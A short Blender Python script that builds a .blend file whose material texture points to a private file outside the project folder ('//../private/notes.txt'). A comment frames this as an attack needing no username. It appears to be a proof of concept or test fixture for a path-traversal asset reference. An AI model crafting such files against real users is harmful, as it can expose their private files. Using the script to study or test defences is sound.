import bpy, sys
out = sys.argv[sys.argv.index('--') + 1]
bpy.ops.object.select_all(action='SELECT'); bpy.ops.object.delete()
bpy.ops.mesh.primitive_cube_add()
mat = bpy.data.materials.new('m'); mat.use_nodes = True
tex = mat.node_tree.nodes.new('ShaderNodeTexImage')
img = bpy.data.images.new('ref', 4, 4); img.source = 'FILE'
img.filepath = '//../private/notes.txt'   # relative to the .blend; attacker needs no username
tex.image = img
mat.node_tree.links.new(tex.outputs['Color'], mat.node_tree.nodes['Principled BSDF'].inputs['Base Color'])
bpy.context.active_object.data.materials.append(mat)
bpy.ops.wm.save_as_mainfile(filepath=out, relative_remap=False)
